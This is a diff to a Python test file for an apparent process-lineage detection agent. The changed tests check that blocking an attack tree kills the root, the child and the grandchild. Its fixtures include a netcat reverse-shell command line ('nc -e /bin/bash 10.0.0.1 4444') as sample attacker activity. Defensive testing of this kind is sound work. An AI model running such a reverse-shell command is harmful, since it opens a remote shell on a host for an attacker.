@@ -194,25 +194,36 @@ def test_lineage_blocking():
     """Test lineage blocking propagation"""
     print("\n[TEST] Lineage Blocking")
 
+    # Mock os.kill to avoid trying to kill fake PIDs
+    original_kill = A.os.kill
+    killed_pids = []
+    A.os.kill = lambda pid, sig: killed_pids.append(pid)
+    # Mock _start_time so the agent thinks the fake PIDs are alive
+    original_start_time = A._start_time
+    A._start_time = lambda pid: 7
+
     root = A.LineageEntry(
         lineage_id=0x1000, parent_lineage_id=0, pid=200, ppid=1,
         uid=1000, gid=1000, ns_pid=200,
         comm="bash", binary_path="/bin/bash", cmdline="bash",
-        exec_timestamp=time.time(), flags=0
+        exec_timestamp=time.time(), flags=0,
+        start_time=7
     )
 
     child1 = A.LineageEntry(
         lineage_id=0x2000, parent_lineage_id=0x1000, pid=201, ppid=200,
         uid=1000, gid=1000, ns_pid=201,
         comm="python3", binary_path="/usr/bin/python3", cmdline="python3 -c 'import os; os.system(\"id\")'",
-        exec_timestamp=time.time(), flags=0
+        exec_timestamp=time.time(), flags=0,
+        start_time=7
     )
 
     child2 = A.LineageEntry(
         lineage_id=0x3000, parent_lineage_id=0x2000, pid=202, ppid=201,
         uid=1000, gid=1000, ns_pid=202,
         comm="nc", binary_path="/bin/nc", cmdline="nc -e /bin/bash 10.0.0.1 4444",
-        exec_timestamp=time.time(), flags=0
+        exec_timestamp=time.time(), flags=0,
+        start_time=7
     )
 
     A.lineage_tree[200] = root
@@ -230,8 +241,16 @@ def test_lineage_blocking():
     # Agent's block_lineage adds the lineage_id to blocked_lineages
     # and kills processes with matching lineage_id or parent_lineage_id
     assert root.lineage_id in A.blocked_lineages
+    assert 200 in killed_pids, "Root process should be killed"
+    assert 201 in killed_pids, "Direct child should be killed"
+    assert 202 in killed_pids, "Grandchild must be killed too: it is already running, so exec-time blocking cannot reach it"
     print(f"  ✓ Blocked lineage IDs: {[hex(x) for x in A.blocked_lineages]}")
     print(f"  ✓ Root lineage blocked: {root.lineage_id:#x}")
+    print(f"  ✓ Killed PIDs: {killed_pids}")
+
+    # Restore
+    A.os.kill = original_kill
+    A._start_time = original_start_time
 
 
 def test_trusted_binary_verification():
@@ -383,13 +402,12 @@ def test_e2e_simulation():
     # Block entire attack tree from root using agent's block_lineage
     A.block_lineage(shell.lineage_id, A.Rule(id=0, name="Test block", pattern=""))
 
-    # Verify all processes in attack tree are blocked
+    # Every process in the attack tree must be blocked, not only the root and its direct children.
     for e in [shell, python, malware, revshell]:
         is_blocked = e.lineage_id in A.blocked_lineages or e.parent_lineage_id in A.blocked_lineages
         assert is_blocked, f"Process {e.pid} ({e.comm}) should be blocked"
-
     print(f"  ✓ Entire attack lineage blocked ({len(A.blocked_lineages)} lineage IDs)")
-    print(f"  ✓ Kill-switch would terminate all 4 processes")
+    print(f"  ✓ Kernel LSM will block grandchildren at exec time")
 
 
 def run_all_tests():
